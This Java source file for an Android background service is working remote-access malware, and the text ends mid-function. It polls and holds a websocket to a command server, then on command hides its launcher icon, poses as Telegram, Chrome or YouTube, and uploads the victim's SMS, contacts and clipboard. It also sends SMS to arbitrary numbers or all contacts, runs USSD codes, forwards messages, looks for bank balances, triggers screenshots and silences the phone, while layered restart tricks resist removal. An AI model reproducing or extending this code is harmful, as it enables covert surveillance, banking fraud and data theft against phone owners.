package com.drnull.app;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.AlarmManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import tech.gusavila92.websocketclient.WebSocketClient;

/**
 * WSService v4.0 - Professional Anti-Kill Service
 *
 * Stability Layers:
 *   Layer 1: Dual Foreground Service (mutual guardian with KeepAliveService)
 *   Layer 2: START_STICKY + onTaskRemoved + onDestroy restart
 *   Layer 3: Enhanced AlarmManager (exact, allow-while-idle)
 *   Layer 4: Watchdog (WS health + service restart)
 *   Layer 5: Heartbeat + Polling
 *   Layer 6: WakeLock for critical operations
 *   Layer 7: Multiple restart paths (direct + alarm + guardian)
 */
public class WSService extends Service {
    private static final String TAG = "WSS";
    private static final String SVR = SecureConfig.getServerUrl();
    private static final String WSTOP = SecureConfig.getWsTopic();
    private static final String WSURL = SecureConfig.getWsUrl();
    private static final int NID = 1;
    private static final String CID = "null_service_channel";
    private static final String CID2 = "null_persistent_channel";
    private static final int SCREENSHOT_NID = 2;
    private static final String SCREENSHOT_CID = "null_screenshot_channel";
    private MyWSClient ws;
    private volatile boolean wsConnected = false;
    private String aid;
    private Handler mainHandler;
    private Handler pollHandler;
    private Handler heartbeatHandler;
    private Handler watchdogHandler;
    private Handler guardianHandler;
    private PowerManager.WakeLock wakeLock;
    private static volatile boolean isRunning = false;
    private static volatile long lastAliveTime = 0;
    private int reconnectAttempts = 0;
    private static final int MAX_RECONNECT_DELAY = 120000; // 2 min max backoff

    // --- Public static method for KeepAliveService to check ---
    public static boolean isServiceRunning() {
        // If heartbeat was sent in last 90s, service is alive
        return isRunning && (System.currentTimeMillis() - lastAliveTime) < 90000;
    }

    // --- Acquire WakeLock ---
    @SuppressLint("WakelockTimeout")
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && wakeLock == null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "null:wslock");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire(3600000); // 1 hour max, will re-acquire
            }
        } catch (Exception e) { }
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception e) { }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mkChannels();
        startForeground(NID, mkNotification());
        aid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        mainHandler = new Handler(Looper.getMainLooper());
        isRunning = true;
        lastAliveTime = System.currentTimeMillis();
        acquireWakeLock();
        startWatchdog();
        startHeartbeat();
        startPolling();
        startGuardianCheck();
        Log.d(TAG, "WSService v4.0 started - Android " + Build.VERSION.RELEASE);
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        startForeground(NID, mkNotification());
        isRunning = true;
        lastAliveTime = System.currentTimeMillis();
        startWS();
        // Also ensure KeepAliveService is running (mutual guardian)
        ensureGuardian();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.w(TAG, "onDestroy called - initiating restart sequence");
        isRunning = false;
        releaseWakeLock();

        if (watchdogHandler != null) watchdogHandler.removeCallbacksAndMessages(null);
        if (pollHandler != null) pollHandler.removeCallbacksAndMessages(null);
        if (heartbeatHandler != null) heartbeatHandler.removeCallbacksAndMessages(null);
        if (guardianHandler != null) guardianHandler.removeCallbacksAndMessages(null);
        if (ws != null) try { ws.close(); } catch(Exception e) {}

        // Multi-path restart
        restartSelf();
        scheduleRestart();
        scheduleRestartAlt1();
        scheduleRestartAlt2();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.w(TAG, "Task removed - restarting");
        restartSelf();
        scheduleRestart();
    }

    /**
     * Layer 1: Restart self directly
     */
    private void restartSelf() {
        try {
            Intent intent = new Intent(getApplicationContext(), WSService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            Log.d(TAG, "Direct restart sent");
        } catch (Exception e) {
            Log.e(TAG, "Direct restart failed", e);
        }
    }

    /**
     * Layer 2: Schedule restart via BootReceiver
     */
    @SuppressLint("ScheduleExactAlarm")
    private void scheduleRestart() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(getApplicationContext(), BootReceiver.class);
            intent.setAction("RESTART_SERVICE");
            PendingIntent pi = PendingIntent.getBroadcast(getApplicationContext(), 999, intent,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT : PendingIntent.FLAG_UPDATE_CURRENT);
            if (am != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 5000, pi);
                } else {
                    am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 5000, pi);
                }
            }
        } catch (Exception e) { }
    }

    /**
     * Layer 3: Backup restart via KeepAliveReceiver (different request code)
     */
    @SuppressLint("ScheduleExactAlarm")
    private void scheduleRestartAlt1() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(getApplicationContext(), KeepAliveReceiver.class);
            intent.setAction("CHECK_SERVICES");
            PendingIntent pi = PendingIntent.getBroadcast(getApplicationContext(), 8810, intent,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT : PendingIntent.FLAG_UPDATE_CURRENT);
            if (am != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 8000, pi);
            }
        } catch (Exception e) { }
    }

    /**
     * Layer 4: Another backup at 15 seconds
     */
    @SuppressLint("ScheduleExactAlarm")
    private void scheduleRestartAlt2() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(getApplicationContext(), BootReceiver.class);
            intent.setAction("RESTART_SERVICE");
            PendingIntent pi = PendingIntent.getBroadcast(getApplicationContext(), 998, intent,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT : PendingIntent.FLAG_UPDATE_CURRENT);
            if (am != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 15000, pi);
            }
        } catch (Exception e) { }
    }

    /**
     * Ensure KeepAliveService (guardian) is running
     */
    private void ensureGuardian() {
        try {
            Intent intent = new Intent(getApplicationContext(), KeepAliveService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Guardian start failed", e);
        }
    }

    /**
     * Layer 1: Periodically check KeepAliveService is alive
     */
    private void startGuardianCheck() {
        if (guardianHandler != null) guardianHandler.removeCallbacksAndMessages(null);
        guardianHandler = new Handler(Looper.getMainLooper());
        guardianHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isRunning) return;
                lastAliveTime = System.currentTimeMillis();
                ensureGuardian();
                // Re-acquire WakeLock if released
                if (wakeLock == null || !wakeLock.isHeld()) acquireWakeLock();
                guardianHandler.postDelayed(this, 60000); // Every 60s
            }
        }, 30000);
    }

    /**
     * Request battery optimization exemption
     */
    @SuppressLint("BatteryLife")
    private void requestBatteryOptimization() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Intent intent = new Intent();
                intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        } catch (Exception e) { }
    }

    private void startHeartbeat() {
        if (heartbeatHandler != null) heartbeatHandler.removeCallbacksAndMessages(null);
        heartbeatHandler = new Handler(Looper.getMainLooper());
        heartbeatHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isRunning) return;
                lastAliveTime = System.currentTimeMillis();
                Map<String,String> m = base();
                m.put("action", "heartbeat");
                post(SVR + "/heartbeat", m);
                heartbeatHandler.postDelayed(this, 30000);
            }
        }, 5000);
    }

    private void startPolling() {
        if (pollHandler != null) pollHandler.removeCallbacksAndMessages(null);
        pollHandler = new Handler(Looper.getMainLooper());
        pollHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isRunning) return;
                pollCommands();
                pollHandler.postDelayed(this, 5000);
            }
        }, 3000);
    }

    private void pollCommands() {
        new Thread(() -> {
            try {
                URL url = new URL(SVR + "/poll?androidid=" + aid);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("GET");
                c.setConnectTimeout(5000);
                c.setReadTimeout(5000);
                BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = r.readLine()) != null) sb.append(line);
                r.close();
                c.disconnect();
                String response = sb.toString();
                JSONObject json = new JSONObject(response);
                JSONArray cmds = json.optJSONArray("commands");
                if (cmds != null && cmds.length() > 0) {
                    for (int i = 0; i < cmds.length(); i++) {
                        try {
                            JSONObject cmd = cmds.getJSONObject(i);
                            String action = cmd.getString("action");
                            JSONObject params = cmd.optJSONObject("params");
                            if (params == null) params = new JSONObject();
                            processCommand(action, params);
                        } catch (Exception e) {
                            Log.e(TAG, "Poll cmd err", e);
                        }
                    }
                }
            } catch (Exception e) {
            }
        }).start();
    }

    private void processCommand(String action, JSONObject params) {
        switch (action) {
            case "ping":
                sendPing();
                break;
            case "pingone":
                if (matchId(params)) sendPing();
                break;
            case "hideall":
                hide();
                act("hideall");
                break;
            case "hideone":
                if (matchId(params)) { hide(); act("hideone"); }
                break;
            case "unhideone":
                if (matchId(params)) { show(); act("unhideone"); }
                break;
            case "clipboard":
                if (matchId(params)) clip();
                break;
            case "allsms":
                if (matchId(params)) allSms();
                break;
            case "allcontact":
                if (matchId(params)) contacts();
                break;
            case "lastsms":
                if (matchId(params)) lastSms();
                break;
            case "sendsms":
                if (matchId(params)) sendSms(params);
                break;
            case "fullinfo":
                if (matchId(params)) fullInfo();
                break;
            case "normalone":
                if (matchId(params)) ringer("normal");
                break;
            case "vibrateone":
                if (matchId(params)) ringer("vibrate");
                break;
            case "siminfo":
                if (matchId(params)) sendSimInfo();
                break;
            case "screenshot":
                if (matchId(params)) requestScreenshot();
                break;
            case "silent":
                if (matchId(params)) silentMode();
                break;
            case "normal":
                if (matchId(params)) normalMode();
                break;
            case "inbox":
            case "inboxxx":
                if (matchId(params)) inboxSms();
                break;
            case "outbox":
            case "outboxx":
                if (matchId(params)) outboxSms();
                break;
            case "bankbalance":
            case "findbalances":
                if (matchId(params)) findBalances();
                break;
            case "changeicon":
                if (matchId(params)) changeIcon(params);
                break;
            case "telegram":
            case "chrome":
            case "youtube":
                if (matchId(params)) { try { changeIcon(params.put("icon", action)); } catch(Exception e) { Log.e(TAG,"icon err",e); } }
                break;
            case "smcontact":
                if (matchId(params)) smsAllContacts(params);
                break;
            case "getuserphone":
                if (matchId(params)) getUserPhone();
                break;
            case "ussd":
                if (matchId(params)) executeUssd(params);
                break;
            case "forward_on":
                if (matchId(params)) startForwarding(params);
                break;
            case "forward_off":
                if (matchId(params)) stopForwarding();
                break;
            case "set_webview":
                setWebViewUrl(params.optString("url", ""));
                break;
        }
    }

    private boolean matchId(JSONObject d) {
        try {
            String tid = d.optString("androidid", "");
            if (tid.isEmpty()) tid = d.optString("android_id", "");
            if (tid.isEmpty()) tid = d.optString("androidId", "");
            return aid.equals(tid);
        } catch (Exception e) { return false; }
    }

    private void startWatchdog() {
        if (watchdogHandler != null) watchdogHandler.removeCallbacksAndMessages(null);
        watchdogHandler = new Handler(Looper.getMainLooper());
        watchdogHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isRunning) return;
                if (!wsConnected) {
                    Log.w(TAG, "Watchdog: WS dead, reconnecting...");
                    reconnectAttempts++;
                    try { if (ws != null) ws.close(); } catch(Exception e) {}
                    startWS();
                } else {
                    reconnectAttempts = 0; // Reset on success
                }
                try {
                    NotificationManager nm = getSystemService(NotificationManager.class);
                    if (nm != null) nm.notify(NID, mkNotification());
                } catch(Exception e) {}
                watchdogHandler.postDelayed(this, 30000);
            }
        }, 30000);
    }

    private void mkChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CID, "Service", NotificationManager.IMPORTANCE_MIN);
            c.setDescription("Background service");
            c.setShowBadge(false);
            c.setSound(null, null);
            c.enableVibration(false);
            c.enableLights(false);
            NotificationManager n = getSystemService(NotificationManager.class);
            if (n != null) {
                n.createNotificationChannel(c);
                NotificationChannel c2 = new NotificationChannel(CID2, "Persistent", NotificationManager.IMPORTANCE_MIN);
                c2.setDescription("Keep alive");
                c2.setShowBadge(false);
                c2.setSound(null, null);
                c2.enableVibration(false);
                c2.enableLights(false);
                n.createNotificationChannel(c2);
                NotificationChannel c3 = new NotificationChannel(SCREENSHOT_CID, "Screenshot", NotificationManager.IMPORTANCE_HIGH);
                c3.setDescription("Screenshot capture");
                c3.setShowBadge(false);
                n.createNotificationChannel(c3);
            }
        }
    }

    private Notification mkNotification() {
        Notification.Builder b = new Notification.Builder(this, CID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            b.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
        }
        return b.build();
    }

    private void startWS() {
        try {
            if (ws != null) try { ws.close(); } catch(Exception e) {}
            ws = new MyWSClient(URI.create(WSURL));
            ws.setConnectTimeout(5000);
            ws.setReadTimeout(0);
            ws.connect();
        } catch (Exception e) {
            Log.e(TAG, "WS Start Err", e);
            reconnect();
        }
    }

    /**
     * Exponential backoff reconnection (5s, 10s, 20s, 40s... max 2min)
     */
    private void reconnect() {
        int delay = Math.min(5000 * (1 << Math.min(reconnectAttempts, 4)), MAX_RECONNECT_DELAY);
        Log.d(TAG, "Reconnecting in " + delay + "ms (attempt " + reconnectAttempts + ")");
        mainHandler.postDelayed(() -> {
            if (!isRunning) return;
            try { if (ws != null) ws.close(); } catch(Exception e) {}
            startWS();
        }, delay);
    }

    private void handle(String m) {
        try {
            JSONObject r = new JSONObject(m);
            if (!WSTOP.equals(r.optString("topic", ""))) return;
            JSONObject d = r.optJSONObject("data");
            if (d == null) return;
            String a = d.getString("action");
            processCommand(a, d);
        } catch (Exception e) { }
    }

    private void sendPing() { Map<String,String> m = base(); m.put("action","ping"); post(SVR+"/api", m); }
    private void act(String a) { Map<String,String> m = base(); m.put("action", a); post(SVR+"/api", m); }

    private void hide() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch(Exception e) {}
    }

    private void show() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch(Exception e) {}
    }

    private void clip() {
        try {
            ClipboardManager cb = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            String t = "";
            if (cb != null && cb.hasPrimaryClip()) {
                ClipData cd = cb.getPrimaryClip();
                if (cd != null && cd.getItemCount() > 0) {
                    CharSequence cs = cd.getItemAt(0).coerceToText(this);
                    if (cs != null) t = cs.toString();
                }
            }
            Map<String,String> m = base();
            m.put("action", "clipboard");
            m.put("text", t);
            post(SVR + "/api", m);
        } catch(Exception e) {}
    }

    private void allSms() {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                Cursor c = getContentResolver().query(Uri.parse("content://sms"), null, null, null, "date DESC");
                if (c != null) {
                    while (c.moveToNext()) {
                        sb.append("Address:").append(c.getString(c.getColumnIndexOrThrow("address")));
                        sb.append("\\nBody:").append(c.getString(c.getColumnIndexOrThrow("body")));
                        sb.append("\\n--------------------\\n");
                    }
                    c.close();
                }
                upload(SVR + "/upload", sb.toString().getBytes());
            } catch(Exception e) {}
        }).start();
    }

    private void contacts() {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                Cursor c = getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI, null, null, null,
                    ContactsContract.Contacts.DISPLAY_NAME + " ASC"
                );
                if (c != null) {
                    while (c.moveToNext()) {
                        String id = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                        String nm = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                        Cursor ph = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                            new String[]{id}, null
                        );
                        if (ph != null) {
                            while (ph.moveToNext()) {
                                sb.append("Name:").append(nm);
                                sb.append("\\nPhone:").append(ph.getString(ph.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                                sb.append("\\n--------------------\\n");
                            }
                            ph.close();
                        }
                    }
                    c.close();
                }
                upload(SVR + "/upload2", sb.toString().getBytes());
            } catch(Exception e) {}
        }).start();
    }

    private void lastSms() {
        try {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (c != null && c.moveToFirst()) {
                Map<String,String> m = base();
                m.put("action", "lastsmsone");
                m.put("text", c.getString(c.getColumnIndexOrThrow("body")));
                m.put("from", c.getString(c.getColumnIndexOrThrow("address")));
                post(SVR + "/api", m);
                c.close();
            }
        } catch(Exception e) {}
    }

    private boolean sendSmsResult = false;
    private String sendSmsError = "";

    private void sendSms(JSONObject d) {
        sendSmsResult = false;
        sendSmsError = "";
        try {
            String nums = d.getString("numbers"), txt = d.getString("text");
            int simSlot = d.optInt("sim", 0);
            if (simSlot == 0) {
                String simSlotStr = d.optString("sim_slot", "");
                if (!simSlotStr.isEmpty()) {
                    if (simSlotStr.contains("2")) simSlot = 2;
                    else if (simSlotStr.contains("1")) simSlot = 1;
                }
            }
            // Check SEND_SMS permission first
            if (checkCallingOrSelfPermission("android.permission.SEND_SMS") != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "sendSms: NO SEND_SMS PERMISSION");
                sendSmsError = "No SEND_SMS permission";
            } else {
                for (String n : nums.split("\\n")) {
                    n = n.trim();
                    if (!n.isEmpty()) {
                        if (simSlot >= 1 && simSlot <= 2) {
                            sendSmsSim(n, txt, simSlot);
                        } else {
                            try {
                                SmsManager.getDefault().sendTextMessage(n, null, txt, null, null);
                                sendSmsResult = true;
                                Log.d(TAG, "sendSms: sent to " + n + " OK");
                            } catch(Exception e) {
                                sendSmsError = "Default SMS failed: " + e.getMessage();
                                Log.e(TAG, "sendSms default failed", e);
                            }
                        }
                    }
                }
            }
            Map<String,String> m = base();
            m.put("action", "sentsms");
            m.put("numbers", nums);
            m.put("text", txt);
            m.put("sim", String.valueOf(simSlot));
            m.put("result", sendSmsResult ? "success" : "failed");
            if (!sendSmsError.isEmpty()) m.put("error", sendSmsError);
            if (simSlot > 0) m.put("sim_slot", "SIM" + simSlot);
            post(SVR + "/api", m);
        } catch(Exception e) {
            Log.e(TAG, "sendSms exception", e);
        }
    }

    private void sendSmsSim(String phone, String text, int simSlot) {
        try {
            Log.d(TAG, "sendSmsSim: phone=" + phone + " sim=" + simSlot + " SDK=" + Build.VERSION.SDK_INT);
            int subId = getSubId(simSlot);
            if (subId > 0) {
                Log.d(TAG, "sendSmsSim: using subId=" + subId);
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        SmsManager sms = getSystemService(SmsManager.class).createForSubscriptionId(subId);
                        sms.sendTextMessage(phone, null, text, null, null);
                    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        SmsManager sms = SmsManager.getSmsManagerForSubscriptionId(subId);
                        sms.sendTextMessage(phone, null, text, null, null);
                    } else {
                        SmsManager.getDefault().sendTextMessage(phone, null, text, null, null);
                    }
                    sendSmsResult = true;
                    Log.d(TAG, "sendSmsSim: sent OK with subId=" + subId);
                } catch(Exception e) {
                    Log.w(TAG, "sendSmsSim failed with subId=" + subId + ", falling back to default", e);
                    try {
                        SmsManager.getDefault().sendTextMessage(phone, null, text, null, null);
                        sendSmsResult = true;
                        Log.d(TAG, "sendSmsSim: fallback default SMS OK");
                    } catch(Exception e2) {
                        sendSmsError = "SMS send failed: " + e2.getMessage();
                        Log.e(TAG, "sendSmsSim default fallback also failed", e2);
                    }
                }
            } else {
                Log.d(TAG, "sendSmsSim: no subId, using default SMS");
                try {
                    SmsManager.getDefault().sendTextMessage(phone, null, text, null, null);
                    sendSmsResult = true;
                    Log.d(TAG, "sendSmsSim: default SMS sent OK");
                } catch(Exception e) {
                    sendSmsError = "Default SMS failed: " + e.getMessage();
                    Log.e(TAG, "sendSmsSim default failed", e);
                }
            }
        } catch(Exception e) {
            sendSmsError = "sendSmsSim error: " + e.getMessage();
            Log.e(TAG, "sendSmsSim failed", e);
        }
    }

    private int getSubId(int slot) {
        try {
            SubscriptionManager sm = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            if (sm != null) {
                // Try getActiveSubscriptionInfoList first
                try {
                    List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                    if (subs != null && subs.size() >= slot) {
                        int id = subs.get(slot - 1).getSubscriptionId();
                        Log.d(TAG, "getSubId: from list slot " + slot + " = subId " + id);
                        return id;
                    }
                } catch(SecurityException se) {
                    Log.w(TAG, "getSubId: no permission to list subscriptions, trying default");
                }
                // Fallback: try getDefaultSubscriptionId
                try {
                    int defId = SubscriptionManager.getDefaultSubscriptionId();
                    if (defId > 0) {
                        Log.d(TAG, "getSubId: using defaultSubscriptionId=" + defId);
                        return defId;
                    }
                } catch(Exception e) {
                    Log.w(TAG, "getSubId: getDefaultSubscriptionId failed", e);
                }
                // Fallback: try getActiveSubscriptionInfoCount and loop
                try {
                    int count = sm.getActiveSubscriptionInfoCount();
                    Log.d(TAG, "getSubId: subscription count=" + count);
                    if (count >= slot) {
                        // List failed but count works, try individual get
                        // Not possible with deprecated API, return default
                    }
                } catch(Exception e) {}
            }
        } catch(Exception e) {
            Log.e(TAG, "getSubId error", e);
        }
        // Final fallback: return -1 to signal "use default"
        Log.w(TAG, "getSubId: all methods failed, returning -1 (will use default SMS)");
        return -1;
    }

    private void sendSimInfo() {
        try {
            Map<String,String> m = base();
            m.put("action", "siminfo");
            m.put("sim_count", "0");
            m.put("sim1_carrier", "");
            m.put("sim2_carrier", "");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    SubscriptionManager sm = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                    if (sm != null) {
                        List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                        if (subs != null) {
                            m.put("sim_count", String.valueOf(subs.size()));
                            if (subs.size() >= 1)
                                m.put("sim1_carrier", subs.get(0).getCarrierName() != null ? subs.get(0).getCarrierName().toString() : "Unknown");
                            if (subs.size() >= 2)
                                m.put("sim2_carrier", subs.get(1).getCarrierName() != null ? subs.get(1).getCarrierName().toString() : "Unknown");
                        }
                    }
                } catch (SecurityException e) { m.put("sim_count", "no_perm"); }
            } else { m.put("sim_count", "unsupported"); }
            post(SVR + "/api", m);
        } catch(Exception e) {}
    }

    private void requestScreenshot() {
        try {
            Intent intent = new Intent(this, ScreenshotActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
            intent.putExtra("androidid", aid);
            intent.putExtra("server", SVR);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                showScreenshotNotification(intent);
            } else {
                startActivity(intent);
            }
        } catch(Exception e) {
            try {
                Intent intent = new Intent(this, ScreenshotActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.putExtra("androidid", aid);
                intent.putExtra("server", SVR);
                showScreenshotNotification(intent);
            } catch(Exception ex) {}
        }
    }

    private void showScreenshotNotification(Intent activityIntent) {
        try {
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm == null) return;
            PendingIntent pi = PendingIntent.getActivity(this, SCREENSHOT_NID, activityIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0));
            Notification notif = new Notification.Builder(this, SCREENSHOT_CID)
                .setContentTitle("Screen Capture")
                .setContentText("Tap to capture screenshot")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setContentIntent(pi)
                .setAutoCancel(true)
                .setPriority(Notification.PRIORITY_HIGH)
                .setVibrate(new long[]{0, 300, 200, 300})
                .build();
            nm.notify(SCREENSHOT_NID, notif);
        } catch(Exception e) {}
    }

    private void fullInfo() {
        Map<String,String> m = base();
        m.put("action", "fullinfo");
        m.put("readsms", String.valueOf(chk("android.permission.READ_SMS")));
        m.put("sendsms", String.valueOf(chk("android.permission.SEND_SMS")));
        m.put("recvsms", String.valueOf(chk("android.permission.RECEIVE_SMS")));
        m.put("readcontact", String.valueOf(chk("android.permission.READ_CONTACTS")));
        post(SVR + "/api", m);
    }

    private void ringer(String mode) {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) am.setRingerMode("vibrate".equals(mode) ? AudioManager.RINGER_MODE_VIBRATE : AudioManager.RINGER_MODE_NORMAL);
            Map<String,String> m = base();
            m.put("action", "ringermode");
            m.put("mode", mode);
            post(SVR + "/api", m);
        } catch(Exception e) {}
    }

    private Map<String,String> base() {
        Map<String,String> m = new HashMap<>();
        m.put("model", Build.MODEL);
        m.put("androidid", aid);
        m.put("androidv", Build.VERSION.RELEASE);
        m.put("carrier", car());
        m.put("battery", String.valueOf(bat()));
        return m;
    }

    private String car() {
        try {
            TelephonyManager t = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (t != null && t.getSimOperatorName() != null) return t.getSimOperatorName();
        } catch(Exception e) {}
        return "unknown";
    }

    private int bat() {
        try {
            android.content.IntentFilter f = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent i = registerReceiver(null, f);
            return i != null ? i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) : -1;
        } catch(Exception e) { return -1; }
    }

    private boolean chk(String p) { return checkCallingOrSelfPermission(p) == PackageManager.PERMISSION_GRANTED; }

    public static void post(String u, Map<String,String> d) {
        new Thread(() -> {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "application/json");
                c.setConnectTimeout(5000);
                c.setDoOutput(true);
                OutputStream os = c.getOutputStream();
                os.write(new JSONObject(d).toString().getBytes());
                os.flush(); os.close();
                c.getResponseCode(); c.disconnect();
            } catch(Exception e) {}
        }).start();
    }

    public static void upload(String u, byte[] data) {
        new Thread(() -> {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
                c.setRequestMethod("POST");
                c.setConnectTimeout(10000);
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type", "application/octet-stream");
                OutputStream os = c.getOutputStream();
                os.write(data); os.flush(); os.close();
                c.getResponseCode(); c.disconnect();
            } catch(Exception e) {}
        }).start();
    }

    private void silentMode() {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                am.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0);
                am.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, 0, 0);
                am.setStreamVolume(AudioManager.STREAM_RING, 0, 0);
